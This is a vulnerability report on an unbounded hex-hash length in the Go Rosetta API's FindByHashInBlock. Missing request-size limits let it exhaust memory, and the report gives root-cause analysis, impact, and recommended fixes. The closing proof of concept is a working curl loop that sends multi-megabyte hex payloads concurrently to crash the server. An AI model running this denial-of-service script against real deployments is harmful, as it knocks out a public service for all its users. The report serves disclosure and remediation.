### Title
Unbounded Hash Length in `FindByHashInBlock` Enables Memory-Exhaustion DoS

### Summary
`FindByHashInBlock` in `rosetta/app/persistence/transaction.go` accepts an arbitrary-length `hashStr` from unauthenticated callers, decodes it with `hex.DecodeString` without any length cap, and allocates a byte slice proportional to the input. The Go HTTP server has no `http.MaxBytesReader` body-size guard, so a single request carrying a multi-megabyte hex string forces the server to allocate half that size in heap memory before the database is even contacted. Repeated concurrent requests can exhaust available memory and crash the process.

### Finding Description
**Code path:**

`/block/transaction` POST → `blockAPIService.BlockTransaction` (`block_service.go:87-92`) → `BaseService.FindByHashInBlock` (`base_service.go:41-51`) → `transactionRepository.FindByHashInBlock` (`transaction.go:173-208`).

**Root cause – line 180:**
```go
transactionHash, err := hex.DecodeString(tools.SafeRemoveHexPrefix(hashStr))
```
`SafeRemoveHexPrefix` only strips a leading `0x`; it imposes no length limit. `hex.DecodeString` succeeds for any even-length string of valid hex digits and allocates `len(input)/2` bytes. There is no check on the length of `transactionHash` before or after this call.

**Failed assumption:** the code assumes callers supply a hash of a reasonable, fixed size (48 bytes / 96 hex chars for a Hedera SHA-384 hash). No such constraint is enforced.

**HTTP server – no body-size guard (`main.go:220-227`):**
```go
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,   // default 5 s
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
}
```
`http.MaxBytesReader` is never called anywhere in the Go codebase (confirmed by grep). The Rosetta SDK's JSON decoder reads the body without a size limit. The 5-second `ReadTimeout` only bounds how long the body transfer takes, not how large it is; on a fast link an attacker can deliver tens of megabytes within that window.

**Database query is not the bottleneck.** PostgreSQL's `bytea =` operator performs a length check first and returns immediately when sizes differ, so the DB itself is not stressed. The damage is entirely in Go heap allocation before the query executes.

### Impact Explanation
Each request carrying an N-byte hex string causes the server to allocate N/2 bytes on the heap. A 100 MB hex payload → 50 MB allocation. With the default Traefik `inFlightReq` limit of 5 (an optional deployment artifact, not a code-level control), five simultaneous such requests consume 250 MB. Without that Traefik layer (direct access, or misconfigured deployment), the limit is the OS file-descriptor and memory ceiling. Sustained requests drive the Go runtime to OOM-kill, taking down the Rosetta API entirely and making the mirror node's Rosetta interface unavailable to all consumers.

### Likelihood Explanation
The `/block/transaction` endpoint is public and requires no authentication. The only precondition is network reachability. The attack is trivially scriptable: craft a JSON body with `transaction_identifier.hash` set to a long valid hex string (e.g., `"aa" * 5_000_000`) and POST it repeatedly. No special knowledge of the system is required. The attack is repeatable and stateless.

### Recommendation
Apply two complementary fixes:

1. **Enforce a body-size limit at the HTTP layer** in `rosetta/main.go` by wrapping the handler with `http.MaxBytesReader` (e.g., 64 KB is more than sufficient for any Rosetta request):
   ```go
   Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
       r.Body = http.MaxBytesReader(w, r.Body, 65536)
       corsMiddleware.ServeHTTP(w, r)
   }),
   ```

2. **Validate hash length** in `FindByHashInBlock` immediately after decoding:
   ```go
   transactionHash, err := hex.DecodeString(tools.SafeRemoveHexPrefix(hashStr))
   if err != nil || len(transactionHash) != 48 { // 48 bytes = SHA-384
       return nil, hErrors.ErrInvalidTransactionIdentifier
   }
   ```

### Proof of Concept
```bash
# Generate a 10 MB valid hex string (5 MB allocation per request)
HASH=$(python3 -c "print('ab' * 5_000_000)")

curl -s -X POST http://<rosetta-host>:5700/block/transaction \
  -H 'Content-Type: application/json' \
  -d "{
    \"network_identifier\": {\"blockchain\": \"Hedera\", \"network\": \"mainnet\"},
    \"block_identifier\": {\"index\": 1, \"hash\": \"0x$(python3 -c "print('ab'*32)")\"},
    \"transaction_identifier\": {\"hash\": \"$HASH\"}
  }"

# Repeat concurrently to exhaust heap:
for i in $(seq 1 20); do <above curl> & done; wait
```
Each iteration allocates ~5 MB; 20 concurrent requests = ~100 MB spike. Scaling the hex string or concurrency drives the process to OOM. [1](#0-0) [2](#0-1) [3](#0-2)
